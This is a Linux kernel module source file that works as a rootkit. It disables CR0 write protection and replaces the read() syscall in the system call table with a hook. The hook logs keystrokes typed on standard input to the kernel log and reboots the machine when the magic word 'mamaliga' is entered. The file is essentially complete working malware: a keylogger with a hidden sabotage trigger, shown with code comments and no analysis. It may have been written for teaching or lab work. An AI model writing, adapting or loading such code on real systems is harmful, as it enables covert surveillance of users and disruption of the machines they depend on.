#include <linux/module.h>   /* Needed by all modules */
#include <linux/unistd.h>   /* Needed for __NR_read */
#include <linux/reboot.h>   /* Needed for kernel_restart() */
#include "sysmap.h"   /* Needed for ROOTKIT_SYS_CALL_TABLE */

#define MAGIC "mamaliga"
#define SIZEOF_MAGIC 8

void **sys_call_table;
asmlinkage long (*read_syscall_ref)(unsigned int fd, char __user *buf, size_t count);
int pos;

asmlinkage long my_read_syscall_ref(unsigned int fd, char __user *buf, size_t count)
{
	long ret;
	int i;

	ret = read_syscall_ref(fd, buf, count);

	if (count != 1 || fd != 0)
		return ret;

	/* The magic command is partial, print what was written so far */
	if (MAGIC[pos] != buf[0]) {
		for (i = 0; i < pos; ++i)
			printk(KERN_INFO "Found: %c", MAGIC[i]);

		pos = 0;
		printk(KERN_INFO "Found: %c", buf[0]);
		return ret;
	}

	pos++;
	if (SIZEOF_MAGIC-1 < pos) {
		printk(KERN_INFO "Mouaxaxaxaxaxa!");
		kernel_restart(NULL);
	}

	return ret;
}


/* Initialization function which is called when the module is
   insmoded into the kernel. It replaces the read() syscall. */
static int __init interceptor_start(void)
{
	unsigned long original_cr0;

    /* Reading contents of control register cr0. The cr0 register has various
       control flags that modify the basic operation of the processor. */
	original_cr0 = read_cr0();

    /* Disable `write-protect` mode. Do so by setting the WP (Write protect)
       bit to 0. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 & ~0x00010000);

    /* Store original read() syscall */
	sys_call_table = (void *) ROOTKIT_SYS_CALL_TABLE;
	read_syscall_ref = (void *) sys_call_table[__NR_read];

    /* Replace in the system call table the original
       read() syscall with our intercepting function */
	sys_call_table[__NR_read] = (unsigned long *) my_read_syscall_ref;

    /* Enable `write-protect` mode */
	write_cr0(original_cr0);

	printk(KERN_INFO "%s\n", "Hello");

    /* A non 0 return value means init_module failed; module can't be loaded */
	return 0;
}


/* Cleanup function which is called just before module
   is rmmoded. It restores the original read() syscall. */
static void __exit interceptor_end(void)
{
    /* Reading contents of control register cr0. The cr0 register has various
       control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

    /* Disable `write-protect` mode */
	write_cr0(original_cr0 & ~0x00010000);

    /* Restores original read() syscall */
	sys_call_table[__NR_read] = (unsigned long *) read_syscall_ref;

    /* Enable `write-protect` mode */
	write_cr0(original_cr0);

	printk(KERN_INFO "%s\n", "Bye bye");

	return;
}


module_init(interceptor_start);
module_exit(interceptor_end);

MODULE_LICENSE("GPL");
